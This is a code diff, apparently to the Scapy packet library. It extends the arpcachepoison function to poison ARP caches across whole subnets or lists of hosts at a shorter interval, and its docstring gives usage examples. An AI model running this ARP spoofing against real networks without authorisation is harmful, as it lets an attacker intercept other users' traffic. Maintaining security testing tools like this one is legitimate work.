@@ -9,7 +9,6 @@ Classes and functions for layer 2 protocols.
 
 from __future__ import absolute_import
 from __future__ import print_function
-import os
 import struct
 import time
 import socket
@@ -548,9 +547,10 @@ class ARP(Packet):
 
 
 def l2_register_l3_arp(l2, l3):
-    # type: (Type[Packet], Type[Packet]) -> Optional[str]
+    # type: (Packet, Packet) -> Optional[str]
     # TODO: support IPv6?
-    if l3.plen == 4:
+    plen = l3.plen if l3.plen is not None else l3.get_field("pdst").i2len(l3, l3.pdst)
+    if plen == 4:
         return getmacbyip(l3.pdst)
     log_runtime.warning(
         "Unable to guess L2 MAC address from an ARP packet with a "
@@ -731,13 +731,15 @@ conf.l3types.register(ETH_P_ARP, ARP)
 
 @conf.commands.register
 def arpcachepoison(
-    target,  # type: str
+    target,  # type: Union[str, List[str]]
     addresses,  # type: Union[str, Tuple[str, str], List[Tuple[str, str]]]
-    interval=60,  # type: int
+    interval=15,  # type: int
 ):
     # type: (...) -> None
-    """Poison target's ARP cache
+    """Poison targets' ARP cache
 
+    :param target: Can be an IP, subnet (string) or a list of IPs. This lists the IPs
+                   or subnets that will be poisoned.
     :param addresses: Can be either a string, a tuple of a list of tuples.
                       If it's a string, it's the IP to usurpate in the victim,
                       with the local interface's MAC. If it's a tuple,
@@ -746,28 +748,33 @@ def arpcachepoison(
     Examples for target "192.168.0.2"::
 
         >>> arpcachepoison("192.168.0.2", "192.168.0.1")
+        >>> arpcachepoison("192.168.0.1/24", "192.168.0.1")
+        >>> arpcachepoison(["192.168.0.2", "192.168.0.3"], "192.168.0.1")
         >>> arpcachepoison("192.168.0.2", ("192.168.0.1", get_if_hwaddr("virbr0")))
         >>> arpcachepoison("192.168.0.2", [("192.168.0.1", get_if_hwaddr("virbr0"),
         ...                                ("192.168.0.2", "aa:aa:aa:aa:aa:aa")])
 
     """
+    if isinstance(target, str):
+        targets = Net(target)  # type: Union[Net, List[str]]
+        str_target = target
+    else:
+        targets = target
+        str_target = target[0]
     if isinstance(addresses, str):
-        couple_list = [(addresses, get_if_hwaddr(conf.route.route(target)[0]))]
+        couple_list = [(addresses, get_if_hwaddr(conf.route.route(str_target)[0]))]
     elif isinstance(addresses, tuple):
         couple_list = [addresses]
     else:
         couple_list = addresses
-    tmac = getmacbyip(target)
     p = [
-        Ether(dst=tmac, src=y) / ARP(op="who-has", psrc=x, pdst=target,
-                                     hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
+        Ether(src=y) / ARP(op="who-has", psrc=x, pdst=targets,
+                           hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
         for x, y in couple_list
     ]
     try:
         while True:
-            sendp(p, iface_hint=target)
-            if conf.verb > 1:
-                os.write(1, b".")
+            sendp(p, iface_hint=str_target)
             time.sleep(interval)
     except KeyboardInterrupt:
         pass
